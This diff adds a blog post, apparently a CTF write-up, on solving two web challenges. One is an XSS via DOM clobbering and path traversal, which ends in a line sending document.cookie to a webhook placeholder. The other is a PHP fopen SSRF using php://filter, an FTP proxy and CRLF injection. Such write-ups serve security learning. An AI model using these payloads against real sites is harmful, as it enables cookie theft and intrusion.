@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+
+<head>
+    <!-- Cool font :) -->
+    <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@100..900" rel="stylesheet">
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/go.min.js"></script>
+
+    <script>hljs.highlightAll();</script>
+    <!-- Custom CSS Theme :) -->
+    <link rel="stylesheet" href="/style.css">
+    <title>jaquiez</title>
+</head>
+
+<body>
+    <div class="navbar">
+        <ul>
+            <li><a href="/">&nbsp;~&nbsp;</a></li>
+            <li><a href="/Blogs">Blogs</a></li>
+            <li><a href="/Projects">Projects</a></li>
+            <li><a href="/Contact">Contact</a></li>
+        </ul>
+    </div>
+
+    <h1>
+        1337 UP! 2024
+    </h1>
+
+    <div class="container">
+        <h1>
+            Overview
+        </h1>
+        <div class="blog-panel">
+            This weekend I played 1337UP CTF with <b>SavedByTheShell</b>, and despite not being able to try many
+            challenges, I had a lot of fun. Two of the more interesting/involved challenges I looked at were <a
+                href="#safenotes2">SafeNotes 2.0</a> and <a href="#greetings">Greetings</a>.
+        </div>
+        <h1 id="safenotes2">SafeNotes 2.0</h1>
+        <div class="blog-panel">
+            If you know anything about the "notes" genre of challenges in the web category, it usually means you're in
+            for some XSS. With that in mind, let's take a look at the challenge! So let's open the site and see what's
+            going on:
+        </div>
+        <img src="start.png" class="blog-image">
+
+        <h2>Initial Enumeration</h2>
+
+        <div class="blog-panel">
+            The site looks simple enough: we can create notes and with our noteID can view stored notes. So let's try
+            injecting some simple HTML into a note. Creating a note with the content
+            <code class='inline_code'>hello &lt;b&gt;world&lt;/b&gt;</code> gives us the following output:
+        </div>
+        <img src="firstnote.png" class="blog-image">
+        <div class="blog-panel">
+            Looks like we can get HTML injected into our note, so let's try to run some javascript:
+            <code class='inline_code'>&lt;img src=1 onerror=alert(1)&gt;</code>.
+        </div>
+        <img src="notyet.png" class="blog-image">
+        <div class="blog-panel">
+            Viewing the note doesn't run any javascript, and from the image above we can see the <code class='inline_code'>onerror</code>
+            handler is removed. This means that either the server or client is doing some sort of sanitization.
+        </div>
+        <h2>Source Code Analysis</h2>
+        <div class="blog-panel">
+            Well, we've been ignoring the provided source code for too long so let's take a look! After opening the source in
+            VSCode, I decided to do a simple regex search for some common frontend sinks. One of the more common sinks
+            for XSS in the frontend are the <code class='inline_code'>innerHTML</code> and <code class='inline_code'>outerHTML</code> fields. Since these are
+            fields of
+            a DOM object that must be assigned, we can use a simple regex search such as <code class='inline_code'>.*html =</code> to find these sinks.
+        </div>
+        <img src="sinks.png" class="blog-image">
+        <div class="blog-panel">
+            We see two pretty interesting sinks in <code class='inline_code'>views.html</code>, however let's look at the former.
+        </div>
+        <pre>
+            <code class="language-js">function fetchNoteById(noteId) {
+    // Checking "includes" wasn't sufficient, we need to strip ../ *after* we URL decode
+    const decodedNoteId = decodeURIComponent(noteId);
+    const sanitizedNoteId = decodedNoteId.replace(/\.\.[\/\\]/g, '');
+    fetch("/api/notes/fetch/" + sanitizedNoteId, {
+        method: "GET",
+        headers: {
+            "X-CSRFToken": csrf_token,
+        },
+    })
+        .then((response) => response.json())
+        .then((data) => {
+            if (data.content) {
+                document.getElementById("note-content").innerHTML =
+                    DOMPurify.sanitize(data.content);
+                document.getElementById("note-content-section").style.display = "block";
+                showFlashMessage("Note loaded successfully!", "success");
+                // We've seen suspicious activity on this endpoint, let's log some data for review
+                logNoteAccess(sanitizedNoteId, data.content);
+            } else if (data.error) {
+                showFlashMessage("Error: " + data.error, "danger");
+            } else {
+                showFlashMessage("Note doesn't exist.", "info");
+            }
+            // Removed the data.debug section, it was vulnerable to XSS!
+        });
+}</code>
+        </pre>
+        <div class="blog-panel">
+            Our sink is the html of <code class='inline_code'>note-content</code> being set to the output of our note. However, we see
+            that it's first passed into a call to <code class='inline_code'>DOMPurify.sanitize</code>. This will strip out all the "bad"
+            elements in the HTML DOM object that could lead to javascript code execution. Bypassing the latest version of
+            DOMPurify is likely out of scope for this challenge, so let's shift our focus to the second sink we saw
+            (which is also hinted in the comments above):
+        </div>
+        <pre>
+            <code class="language-html">&lt;!-- Remember to comment this out when not debugging!! --&gt;
+&lt;!-- &lt;div id=&quot;debug-content-section&quot; style=&quot;display:none;&quot; class=&quot;note-panel&quot;&gt;
+    &lt;h2&gt;Debug Information&lt;/h2&gt;
+    &lt;div id=&quot;debug-content&quot; class=&quot;note-content&quot;&gt;&lt;/div&gt;
+&lt;/div&gt; --&gt;
+
+&lt;!-- Some other code... --&gt; 
+
+&lt;script&gt;
+function logNoteAccess(noteId, content) {
+    // Read the current username, maybe we need to ban them?
+    const currentUsername = document.getElementById(&quot;username&quot;).innerText;
+    const username = currentUsername || urlParams.get(&quot;name&quot;);
+
+    // Just in case, it seems like people can do anything with the client-side!!
+    const sanitizedUsername = decodeURIComponent(username).replace(/\.\.[\/\\]/g, &#39;&#39;);
+
+    fetch(&quot;/api/notes/log/&quot; + sanitizedUsername, {
+        method: &quot;POST&quot;,
+        headers: {
+            &quot;Content-Type&quot;: &quot;application/json&quot;,
+            &quot;X-CSRFToken&quot;: csrf_token,
+        },
+        body: JSON.stringify({
+            name: username,
+            note_id: noteId,
+            content: content
+        }),
+    })
+        .then(response =&gt; response.json())
+        .then(data =&gt; {
+            // Does the log entry data look OK?
+            document.getElementById(&quot;debug-content&quot;).outerHTML = JSON.stringify(data, null, 2)
+            document.getElementById(&quot;debug-content-section&quot;).style.display = &quot;block&quot;;
+        })
+        .catch(error =&gt; console.error(&quot;Logging failed:&quot;, error));
+}
+&lt;/script&gt;</code>
+        </pre>
+        <div class="blog-panel">
+            As we can see here the html element, <code class='inline_code'>debug-content</code> has its HTML content set to the output of
+            the call to <code class='inline_code'>/api/notes/log</code>. We can also see that above this there is a commented out section of
+            html including the <code class='inline_code'>debug-content</code> div. So if we create a note with a div element with the id
+            <code class='inline_code'>debug-content</code>, then we can abuse this sink. So let's make a simple note:
+            <code class='inline_code'>&lt;div id=&#39;debug-content&#39;&gt;&lt;/div&gt;</code>
+        </div>
+        <img src="closer.png" class="blog-image">
+        <div class="blog-panel">
+            Nice! We were able to set the html content of the response to the api call. However, we want to get our user
+            input to be reflected, so we can't rely on that api call alone. We know that our username is used to build
+            the URL, so what if we abused this fact to traverse back to a different endpoint? Thus, our current attack
+            path is to make a username to call an abusable endpoint, which would look something like:
+            <code class='inline_code'>../../../endpoint_to_abuse</code>.
+        </div>
+        <h2>Building an Exploit</h2>
+        <div class="blog-panel">
+            Now that we know we have to reach an endpoint, we have to decide which endpoint we are going to abuse.
+            Looking at the source in <code class='inline_code'>routes.py</code> we can eliminate all endpoints that don't support
+            <code class='inline_code'>POST</code> as a method since our fetch call uses that method. Looking through the filtered results we can
+            find
+            that the <code class='inline_code'>/contact</code> endpoint reflects our username in the request. This means that if we can make
+            a request to <code class='inline_code'>/contact</code> with a username that contains a XSS payload, then we will get javascript
+            execution on the target.
+        </div>
+        <pre>
+            <code class="language-python"># People were exploiting an open redirect here, should be secure now!
+@main.route('/contact', methods=['GET', 'POST'])
+def contact():
+    if request.method == 'POST':
+        if request.is_json:
+            data = request.get_json()
+            username = data.get('name')
+            content = data.get('content')
+
+            if not username or not content:
+                return jsonify({"message": "Please provide both your name and message."}), 400
+
+            return jsonify({"message": f'Thank you for your message, {username}. We will be in touch!'}), 200
+
+        username = request.form.get('name')
+        content = request.form.get('content')
+
+        if not username or not content:
+            flash('Please provide both your name and message.', 'danger')
+            return redirect(url_for('main.contact'))
+
+        return render_template('contact.html', msg=f'Thank you for your message, {username}. We will be in touch!')
+
+    return render_template('contact.html', msg='Feel free to reach out to us using the form below. We would love to hear from you!')</code>
+        </pre>
+        <div class="blog-panel">
+            Now that we have a goal to traverse back to <code class='inline_code'>create</code>, how can we do this? My first intuition was
+            to make a username that would traverse backwards, however the usernames were capped at 20 characters so this
+            did not pan out. So, we are left at an impasse... Unless, we think back to how our username is set:
+        </div>
+        <pre>
+            <code class="language-js">const currentUsername = document.getElementById("username").innerText;
+const username = currentUsername || urlParams.get("name");</code>
+        </pre>
+        <div class="blog-panel">
+            The <code class='inline_code'>currentUsername</code> field is set by getting the innerText of the username element... So what if
+            we make our own element with the id <code class='inline_code'>username</code>:
+        </div>
+        <pre>
+            <code class="language-html">&lt;div id=&quot;debug-content&quot;&gt;&lt;/div&gt;
+&lt;div id=&quot;username&quot;&gt;This is my new username!&lt;/div&gt;</code></pre>
+        <img src="username.png" class="blog-image">
+        <div class="blog-panel">
+            So now, we can overwrite <code class='inline_code'>username</code>, so let's craft a payload. First, we'll have to bypass the regex
+            that checks for <code class='inline_code'>../</code> which we can do by url encode the first <code class='inline_code'>.</code> in <code class='inline_code'>../</code> like so:
+            <code class='inline_code'>%252e./</code>. This will make it so the call to fetch will see <code class='inline_code'>%2e./</code> which it will evaluate to
+            <code class='inline_code'>../</code>. Next, we add our <code class='inline_code'>/create</code>. But at this point, we must include our XSS payload without
+            breaking the url. Our solution? URL parameters! We can add a URL parameter to the end of our username that
+            will be essentially ignored by the fetch call but will still allow us to add arbitrary content (our
+            payload). So our payload will look like:
+        </div>
+        <pre>
+            <code class="language-html">&lt;div id=&quot;debug-content&quot;&gt;&lt;/div&gt;
+&lt;div id=&quot;username&quot;&gt;%252e./%252e./%252e./%252e./contact?p=&lt;img%20src=1%20onerror=alert(1)&gt;&lt;/div&gt;</code></pre>
+        <img src="almost_there.png" class="blog-image">
+        <div class="blog-panel">
+            However, as we can see above, this doesn't work! It seems like the call to <code class='inline_code'>DOMPurify.sanitize</code>
+            is removing that XSS payload again. In some of the writeups after the CTF, someone noted that using HTML
+            encoding for the tags in <code class='inline_code'>img</code> would bypass the filter and still allow XSS, however I totally missed
+            that! Instead, I opted towards using <a target="_blank"
+                href="https://portswigger.net/web-security/dom-based/dom-clobbering">DOM Clobbering</a>. Recall this
+            assignment from before: <code class='inline_code'>const username = currentUsername || urlParams.get("name");</code>.
+            Essentially, if we can somehow cause <code class='inline_code'>currentUsername</code> to be a <a target="_blank"
+                href="https://developer.mozilla.org/en-US/docs/Glossary/Falsy">falsy</a> value, then we can use the <code class="inline_code">name</code> url
+            parameter to bypass the call to <code class='inline_code'>DOMPurify</code>. Luckily for us, an empty string is falsy so we
+            can just make our username div empty, to let us use the name URL parameter in our note. We can use the same
+            payload as before through the <code class='inline_code'>name</code> URL parameter. We just need to switch out every <code class='inline_code'>%252e./</code> to
+            a <code class='inline_code'>%25252e./</code> to account for the extra layer of URL encoding (since we're now sending the payload from
+            a
+            URL parameter). So the final payload will look something like:
+        </div>
+        <pre>
+            <code class="language-html">&lt;div id=&quot;debug-content&quot;&gt;&lt;/div&gt;
+&lt;div id=&quot;username&quot;&gt;&lt;/div&gt;
+&lt;!--
+https://safenotes2-0.ctf.intigriti.io/view?note=[noteid]&amp;amp;name=%25252e./%25252e./%25252e./contact?p=%3Cimg%20src=1%20onerror=alert(1)%3E            
+--&gt;</code></pre>
+        <img src="xss.png" class="blog-image">
+        <img src="meme-bob-esponja.gif">
+        <div class="blog-panel">
+            Let's go! Now just switch our <code class='inline_code'>alert(1)</code> to a webhook exfiltration such as
+            <code class='inline_code'>document.location=`[webhook]/?c=${document.cookie}`</code> and send our URL to <code class='inline_code'>/report</code>.
+        </div>
+        <img src="solved.png" class="blog-image">
+        <h2>Final Thoughts on SecureNotes 2.0</h2>
+        <div class="blog-panel">
+            Overall, this was a whole lot of fun! The path to exploitation was nice and not too overwhelming, leading to
+            a very gratifying solve. Thanks to the author for the chall!
+        </div>
+        <h1 id="greetings"> Greetings </h1>
+        <div class="blog-panel">
+            Now this challenge gets into some really, really fun exploitation. I spent most of the evening right before
+            CTF end trying to crack this one and got it 30 minutes before the CTF ended! So without further ado, let's jump
+            into the challenge!
+        </div>
+        <img src="greeting.png" class="blog-image">
+        <div class="blog-panel">
+            So we are given a very simple homepage where we can enter our name, and that name is reflected back to us.
+            However, there is very little going on in the frontend. We are given source code so let's take a look at that instead.
+        </div>
+        <h2>Source Code Analysis</h2>
+        <div class="blog-panel">
+            There's a lot of code to look at, so to get the idea of what's important, let's take a look at the
+            docker-compose file.
+        </div>
+        <pre>
+            <code class="language-yaml">services:
+web:
+    build: ./php
+    ports:
+        - "80:80"
+        - "3000"
+        - "5000"
+    restart: always
+node:
+    build: ./node
+    restart: always
+    network_mode: service:web
+flask:
+    build: ./flask
+    environment:
+        FLAG: INTIGRITI{fake_flag}
+    restart: always
+    network_mode: service:web</code></pre>
+        <div class="blog-panel">
+            Looks like there are three services web, node, and flask running a php, nodejs, and python server
+            respectively. However, it looks like only one of them is exposed to the user on port 80 while the others are
+            only available internally. Well, let's work backwards and take a look at the service with the flag: flask.
+        </div>
+        <pre>
+            <code class="language-python">from flask import Flask, request
+import os
+
+app = Flask(__name__)
+
+
+@app.route("/flag", methods=["GET", "POST"])
+def flag():
+    username = request.form.get("username")
+    password = request.headers.get("password")
+    print(f"username={username}",flush=True)
+    print(f"password={password}",flush=True)
+    if username and username == "admin" and password and password == "admin":
+        return os.getenv('FLAG')
+    return "So close"
+
+
+@app.get('/test')
+def test():
+    return "test"
+
+
+app.run(host='0.0.0.0', port=5000)</code></pre>
+        <div class="blog-panel">
+            There are two endpoints here: <code class='inline_code'>/test</code> and <code class='inline_code'>/flag</code>, and if we call <code class='inline_code'>/flag</code> with the correct
+            parameters then we get the flag. However, we can't just visit <code class='inline_code'>/flag</code> directly because it's on port
+            5000 which is not exposed remotely to the user in the docker-compose file. So, with this in mind let's take
+            a look at the node service next.
+        </div>
+        <pre>
+            <code class="language-js">const express = require("express");
+
+const app = express();
+
+app.get("*", (req, res) => {
+    res.send(`Hello, ${req.path.replace(/^\/+|\/+$/g, "")}`);
+});
+
+app.listen(3000, () => {
+    console.log(`App listening on port 3000`);
+});</code></pre>
+        <div class="blog-panel">
+            This looks like another internal server that reflects whatever route the user browses to in the response. The response we see looks familiar to the output we see when we type a name in the frontend application. Either way, we can't know for sure until we view the php web application.
+        </div>
+        <pre>
+            <code class="language-php">&lt;?php
+if(isset($_POST[&#39;hello&#39;]))
+{
+    session_start();
+    $_SESSION = $_POST;
+    if(!empty($_SESSION[&#39;name&#39;]))
+    {
+        $name = $_SESSION[&#39;name&#39;];
+        $protocol = (isset($_SESSION[&#39;protocol&#39;]) &amp;&amp; !preg_match(&#39;/http|file/i&#39;, $_SESSION[&#39;protocol&#39;])) ? $_SESSION[&#39;protocol&#39;] : null;
+        $options = (isset($_SESSION[&#39;options&#39;]) &amp;&amp; !preg_match(&#39;/http|file|\\\/i&#39;, $_SESSION[&#39;options&#39;])) ? $_SESSION[&#39;options&#39;] : null;
+        
+        try {
+            if(isset($options) &amp;&amp; isset($protocol))
+            {
+                $context = stream_context_create(json_decode($options, true));
+                $resp = @fopen(&quot;$protocol://127.0.0.1:3000/$name&quot;, &#39;r&#39;, false, $context);
+            }
+            else
+            {
+                $resp = @fopen(&quot;http://127.0.0.1:3000/$name&quot;, &#39;r&#39;, false);
+            }
+
+            if($resp)
+            {
+                $content = stream_get_contents($resp);
+                echo &quot;&lt;div class=&#39;greeting-output&#39;&gt;&quot; . htmlspecialchars($content) . &quot;&lt;/div&gt;&quot;;
+                fclose($resp);
+            }
+            else
+            {
+                throw new Exception(&quot;Unable to connect to the service.&quot;);
+            }
+        } catch (Exception $e) {
+            error_log(&quot;Error: &quot; . $e-&gt;getMessage());
+            
+            echo &quot;&lt;div class=&#39;greeting-output error&#39;&gt;Something went wrong!&lt;/div&gt;&quot;;
+        }
+    }
+}
+?&gt;</code></pre>
+        <div class="blog-panel">
+            Now we're talking! This php code looks very interesting to us, so let's step through what it's doing. On a <code class="inline_code">POST</code> request with the <code class="inline_code">hello</code> and <code class="inline_code">name</code> parameters set, the server will make a call to <code class='inline_code'>fopen</code> with our untrusted user input. If you know about <a href="https://www.php.net/manual/en/function.fopen.php" target="_blank">fopen</a>, it allows users to open a file or remote connection. It then returns a resource stream that is used to get the content returned by the call. In this case, our user input via the name parameter is appended to a url that connects to <code class="inline_code">localhost:3000</code>. In addition to the name parameter, we can specify <code class="inline_code">protocol</code> and <code class="inline_code">options</code> parameters which are added to the front of the stream and its context respectively. With all of this in mind, it seems our goal is to pass in user input into fopen, that allows us to make a call to <code class="inline_code">/flag</code> such that it receives all of its needed parameters.
+        </div>
+
+        <h2>Exploitation Attempts</h2>
+        <div class="blog-panel">
+            This next part of the challenge required a lot of documentation reading and even more <i>trial and error</i>. So let's jump into some attempts at exploiting this thing. The first thing I tried was to an <code class="inline_code">@</code> to the end of the URL via the name parameter such that the <a href="https://datatracker.ietf.org/doc/html/rfc3986#section-3.2" target="_blank">URL would interpret the first part as userinfo (credentials) and my input at the host to reach out to</a>. However, this did not work as there is a <code class="inline_code">/</code> before our user input meaning the URL would parse our input as purely a route.
+        </div>
+        <img src="justaroute.png" class="blog-image">
+        <div class="blog-panel">
+            So if we can't use the <code class="inline_code">name</code> parameter on its own, then we'll have to use <code class="inline_code">protocol</code> and <code class="inline_code">options</code> as well. However, these new fields have a restriction, they both cannot include the strings <code class="inline_code">file</code> or <code class="inline_code">http</code>, therefore we'll have to work around this. After playing around with the filter for a while, I realized it would not be easy to bypass so instead I looked through the <a href="https://www.php.net/manual/en/wrappers.php" target="_blank">supported schemes and wrappers in PHP</a>. I first looked into the <a href="https://www.php.net/manual/en/wrappers.php.php">php I/O stream wrappers</a> where I found the <a href="https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter">filter</a> wrapper. What's interesting about this wrapper is that it lets us load resources on the server and then pass them through the filters we provide. 
+        </div>
+        <img src="first_try.png" class="blog-image">
+        <div class="blog-panel">
+            There are two issues here: the first being that the host is appended to the resource we are trying to load (making it invalid) and the second is that even if we are able to load local resources, the filter will block any remote http resource loading. So let's instead treat the invalid host as our filter list and using the name parameter from before, we'll load a resource. This will make our URL look something like: <code class="inline_code">php://filter/localhost:3000/resource=/etc/passwd</code>. So let's try it:
+        </div>
+        <img src="fileread.png" class="blog-image">
+        <div class="blog-panel">
+            Nice! Although the filters will throw warnings, they will mostly be ignored so our desired resource will be loaded. We can try to read files however since the flag is on another container, we can't do much more unless we access remote resources. So let's set resource to <code class="inline_code">http://localhost:5000/flag</code> and see what happens:
+        </div>
+        <img src="remote_first.png" class="blog-image">
+        <div class="blog-panel">
+            So that's promising, that is the response from <code class="inline_code">/flag</code>! We are luckily given the <code class="inline_code">options</code> field to make context options for our stream. However, when I tried to pass through <a href="https://www.php.net/manual/en/context.http.php" target="_blank">an HTTP context options stream</a>, it was not accepted as valid options. At first, I thought this was the regex check, but even after removing the check and running the code locally, it was still rejected. This same exact options stream works perfectly fine when the scheme is <code class="inline_code">http</code>, my testing showed that php://filter just doesn't accept and/or pass through the context stream. Unfortunately, it seems that the challenge cannot be solved this way, but as I was looking at other context streams, I noticed something very interesting about ftp in php...
+        </div>
+        <h2>Building Our (Actual) Exploit</h2>
+        <div class="blog-panel">
+            Let's take a look at the <a href="https://www.php.net/manual/en/context.ftp.php" target="_blank">ftp context stream options</a>.
+        </div>
+        <img src="context.png" class="blog-image">
+        <div class="blog-panel">
+            Interesting... We can proxy our FTP request through an HTTP proxy server. So let's send an ftp request to <code class="inline_code">/flag</code> that is proxied towards the internal flask server on <code class='inline_code'>localhost:5000</code>.
+        </div>
+        <img src="reqftp.png" class="blog-image">
+        
+        <div class="blog-panel">
+            Interesting, it looks like our request went through. What does the request look like though? Let's host our own listener on the container on port 6000, send a request, and see what the request looks like:
+        </div>
+        <img src="huh.png" class="blog-image">
+        <img src="math.gif" height="300px">
+        <div class="blog-panel">
+            That HTTP request doesn't look quite right... The route is the entire FTP URL <a href="https://stackoverflow.com/questions/7155529/how-does-http-proxy-work" target="_blank">(which is expected behavior for a HTTP proxy)</a> but it looks like it is going to <code class="inline_code">/flag</code> on the backend server. Why is this the case? Well, after a bit of WSGI investigations, we can see that <a href="https://github.com/pallets/werkzeug/blob/7868bef5d978093a8baa0784464ebe5d775ae92a/src/werkzeug/serving.py#L252" target="_blank">werkzeug will only parse out the path</a>. This is because werkzeug will use <a href="https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urlsplit" target="_blank">urllib.parse.urlsplit</a> to parse out the different parts of the HTTP route. When <code class="inline_code">ftp://127.0.0.1:3000/flag</code> is passed into urlsplit, the object returned will set the scheme, net_loc, and path to ftp, 127.0.0.1:3000, and /flag respectively. And this will cause the later check to set the HTTP request path directly to the path it sees (in this case /flag). 
+        </div>
+<pre>
+    <code class="language-python">def make_environ(self) -> WSGIEnvironment:
+request_url = urlsplit(self.path)
+url_scheme = "http" if self.server.ssl_context is None else "https"
+
+if not self.client_address:
+    self.client_address = ("<local>", 0)
+elif isinstance(self.client_address, str):
+    self.client_address = (self.client_address, 0)
+
+# If there was no scheme but the path started with two slashes,
+# the first segment may have been incorrectly parsed as the
+# netloc, prepend it to the path again.
+if not request_url.scheme and request_url.netloc:
+    path_info = f"/{request_url.netloc}{request_url.path}"
+else:
+    path_info = request_url.path
+
+path_info = unquote(path_info)</code></pre>
+        <img src="parse.png" class="blog-image">
+        <div class="blog-panel">
+            Okay so that explains why this works, but how can satisfy the requests to get the flag? We need to pass in a <code class="inline_code">Password</code> via a header and <code class="inline_code">username</code> via a request body. The way I went about this is via <a href="https://owasp.org/www-community/vulnerabilities/CRLF_Injection" target="_blank">CRLF injection</a> to alter the HTTP request to include both of these. Essentially, since we know the entire raw request is sent over, we can arbitrarily alter the current HTTP request by adding spaces and CRLF to inject our own headers and body. First, we preserve the path by adding a url parameter to the end of /flag. Then we can finish the HTTP request by adding the version, headers, and body separated by CRLFs and spaces where appropriate. So our request should look like the following:
+        </div>
+        <img src="reqdone.png" class="blog-image"> 
+        <img src="solved2.png" class="blog-image">
+        <div class="blog-panel">
+            And there is the solve! If you're wondering why fopen allows us to pass in arbitrary CRLFs into the request, then you would be rightfully concerned. Post competition, one of the other competitors linked <a href="https://bugs.php.net/bug.php?id=81690" target="_blank">this post</a> where the PHP devs claimed it was not their issue to fix. Just another reason to not pass untrusted user input to <code class="inline_code">fopen</code>.
+        </div>
+        <h2>Final Thoughts on Greetings</h2>
+        <div class="blog-panel">
+            This challenge was a lot of fun! I went down a couple rabbit holes but I definitely learned a ton in the process, plus I'll always enjoy challenges where you mess around with CLRF injection and request smuggling. Thank you to the author for the great challenge!
+        </div>
+    </div>
+</body>
